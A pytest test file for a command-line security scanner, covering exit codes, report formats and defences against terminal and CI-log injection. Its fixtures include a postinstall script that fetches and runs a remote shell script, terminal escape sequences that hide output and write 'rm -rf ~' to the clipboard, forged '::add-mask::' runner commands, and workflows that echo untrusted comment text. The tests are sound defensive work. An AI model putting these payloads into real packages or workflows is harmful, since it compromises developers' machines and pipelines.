"""Exit codes, output routing, and the flags people actually type."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from conftest import run_cli

MALICIOUS = "tests/fixtures/malicious/comment-and-control"
CLEAN = "tests/fixtures/clean/vanilla-ci"
TWO_CAP = "tests/fixtures/two_cap/up-no-egress"


def test_critical_exits_1(repo_root):
    assert run_cli([MALICIOUS], cwd=repo_root).returncode == 1


def test_clean_exits_0(repo_root):
    assert run_cli([CLEAN], cwd=repo_root).returncode == 0


def test_warnings_do_not_fail_by_default(repo_root):
    """The obvious implementation is `if findings: return 1`, which ignores
    --fail-on and turns every repo red on day one."""
    result = run_cli([TWO_CAP], cwd=repo_root)
    assert result.returncode == 0, result.stdout


def test_fail_on_warning_catches_them(repo_root):
    assert run_cli([TWO_CAP, "--fail-on", "warning"], cwd=repo_root).returncode == 1


def test_fail_on_none_never_fails(repo_root):
    assert run_cli([MALICIOUS, "--fail-on", "none"], cwd=repo_root).returncode == 0


def test_missing_path_exits_2(repo_root):
    result = run_cli(["tests/fixtures/does-not-exist"], cwd=repo_root)
    assert result.returncode == 2
    assert "does not exist" in result.stderr


def test_no_workflows_exits_0(repo_root, tmp_path):
    """Fresh repos and monorepo subdirectories are legitimate; only a bad path
    is an error.

    But exit 0 must not read as "you are fine". A repo with no Actions is the
    shape of every deployed web app, and this scan has not looked at the app at
    all — so the message states the scope and names the command that does."""
    result = run_cli([str(tmp_path)], cwd=repo_root)
    assert result.returncode == 0
    assert "has not looked at your app" in result.stderr
    assert "tridelphi expose" in result.stderr


def test_require_workflows_makes_it_an_assertion(repo_root, tmp_path):
    assert run_cli([str(tmp_path), "--require-workflows"], cwd=repo_root).returncode == 2


def test_sarif_goes_to_stdout_clean(repo_root):
    """Diagnostics must not corrupt `--format sarif > out.sarif`."""
    result = run_cli([MALICIOUS, "--format", "sarif"], cwd=repo_root)
    document = json.loads(result.stdout)
    assert document["version"] == "2.1.0"


def test_text_and_sarif_file_combine(repo_root, tmp_path):
    """CI needs both: text in the job log, SARIF for upload. Forcing either/or
    makes the log useless, which is where findings are actually read."""
    out = tmp_path / "out.sarif"
    result = run_cli(
        [MALICIOUS, "--format", "text", "--sarif-file", str(out)], cwd=repo_root
    )
    assert result.returncode == 1
    assert "CRITICAL" in result.stdout
    assert json.loads(out.read_text())["version"] == "2.1.0"


def test_malformed_yaml_is_a_finding_not_a_crash(repo_root, tmp_path):
    """Exit 2 on the whole run kills the scan; silent skip is a bypass, because
    anyone able to choke the parser would become invisible."""
    workflows = tmp_path / ".github/workflows"
    workflows.mkdir(parents=True)
    (workflows / "broken.yml").write_text("on: push\njobs:\n  a:\n   - [unclosed\n")
    (workflows / "fine.yml").write_text(
        "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n"
    )
    result = run_cli(
        [str(tmp_path), "--fail-on", "warning", "--min-severity", "warning"], cwd=repo_root
    )
    assert result.returncode == 1
    assert "parse-error" in result.stdout


def test_strict_parse_escalates_to_2(repo_root, tmp_path):
    workflows = tmp_path / ".github/workflows"
    workflows.mkdir(parents=True)
    (workflows / "broken.yml").write_text("jobs:\n  a:\n   - [unclosed\n")
    assert run_cli([str(tmp_path), "--strict-parse"], cwd=repo_root).returncode == 2


def test_explain_renders_rule_help(repo_root):
    result = run_cli(["--explain", "agent-config-ingress"], cwd=repo_root)
    assert result.returncode == 0
    assert "restores" in result.stdout


def test_explain_unknown_rule_exits_2(repo_root):
    assert run_cli(["--explain", "nope"], cwd=repo_root).returncode == 2


def test_core_subcommand_and_bare_path_agree(repo_root):
    bare = run_cli([CLEAN, "--quiet"], cwd=repo_root)
    core = run_cli(["core", CLEAN, "--quiet"], cwd=repo_root)
    assert bare.returncode == core.returncode == 0
    assert bare.stdout == core.stdout


def test_version_and_help(repo_root):
    assert run_cli(["--version"], cwd=repo_root).returncode == 0
    assert run_cli(["--help"], cwd=repo_root).returncode == 0


def test_start_gives_three_plain_english_paths(repo_root):
    result = run_cli(["start"], cwd=repo_root)
    assert result.returncode == 0
    assert "three doors" in result.stdout
    assert "tridelphi scan" in result.stdout
    assert "tridelphi core" in result.stdout
    assert "tridelphi expose" in result.stdout


def test_self_check_validates_schema(repo_root):
    result = run_cli([MALICIOUS, "--format", "sarif", "--self-check"], cwd=repo_root)
    assert result.returncode == 1
    assert json.loads(result.stdout)


def test_undecodable_workflow_name_still_reports(tmp_path):
    """Linux file names are bytes. A workflow named with a non-UTF-8 byte used
    to crash the scan (a strict encode in the fingerprint), leaving a traceback
    and no report — and a pull request can add such a file."""
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    try:
        with open(bytes(workflows) + b"/bad\xff.yml", "wb") as handle:
            handle.write(
                b"on: issue_comment\njobs:\n  a:\n    runs-on: ubuntu-latest\n"
                b"    permissions:\n      contents: write\n    steps:\n"
                b'      - run: echo "${{ github.event.comment.body }}" && curl https://x.example\n'
            )
    except (OSError, ValueError):
        pytest.skip("this filesystem refuses non-UTF-8 file names")
    report_md = tmp_path / "report.md"
    report_sarif = tmp_path / "report.sarif"
    proc = run_cli([
        str(tmp_path), "--format", "text",
        "--checklist-md-file", str(report_md), "--sarif-file", str(report_sarif),
    ])
    assert "Traceback" not in proc.stderr, proc.stderr
    assert proc.returncode == 1, "the critical in that workflow must still gate"
    assert report_md.is_file() and report_sarif.is_file()
    # The name survives as a visible escape (`\udcff`), not as invalid UTF-8.
    assert "udcff" in report_md.read_text(encoding="utf-8")


def _hostile_lines(text: str) -> list[str]:
    """Lines a terminal would obey or a runner would read as a command."""
    return [
        line for line in text.splitlines()
        if "\x1b" in line or "\x07" in line or "\r" in line
        or line.lstrip().startswith(("::", "##["))
    ]


def test_scanned_package_cannot_drive_the_terminal(repo_root, tmp_path):
    """`tridelphi scan` quotes the install script it flags. The package wrote
    that script, so it chooses the bytes: ESC[8m would hide the rest of the
    report — the DO NOT INSTALL verdict with it — and OSC 52 asks some
    terminals to overwrite the clipboard."""
    package = tmp_path / "evil"
    package.mkdir()
    (package / "package.json").write_text(json.dumps({
        "name": "evil",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl -s http://203.0.113.9/a.sh | sh \x1b[8m\x1b]52;c;cm0gLXJmIH4=\x07"
                           "\n::add-mask::DO NOT INSTALL",
        },
    }))
    for fmt in ("checklist", "text"):
        result = run_cli(["scan", str(package), "--format", fmt], cwd=repo_root)
        assert result.returncode == 1, result.stderr
        assert not _hostile_lines(result.stdout + result.stderr), fmt
        assert "\\u001b[8m" in result.stdout, "the payload is shown, escaped"


def test_workflow_names_cannot_drive_the_terminal_or_the_runner(repo_root, tmp_path):
    """A pull request names its own workflow files and job ids, and the Action
    prints the report into the runner's log, where a line starting `::` is a
    command: `::add-mask::`, `::stop-commands::`, a forged `::error::`."""
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    try:
        path = workflows / "x\n::add-mask::CRITICAL\n.yml"
        path.write_text(
            'on: issue_comment\njobs:\n  "b\\e[8m":\n    runs-on: ubuntu-latest\n'
            "    permissions:\n      contents: write\n    steps:\n"
            '      - run: echo "${{ github.event.comment.body }}" && curl https://x.example\n'
        )
    except (OSError, ValueError):
        pytest.skip("this filesystem refuses control characters in file names")
    for fmt in ("text", "checklist"):
        result = run_cli([str(tmp_path), "--format", fmt], cwd=repo_root)
        assert result.returncode == 1, result.stderr
        assert not _hostile_lines(result.stdout + result.stderr), fmt
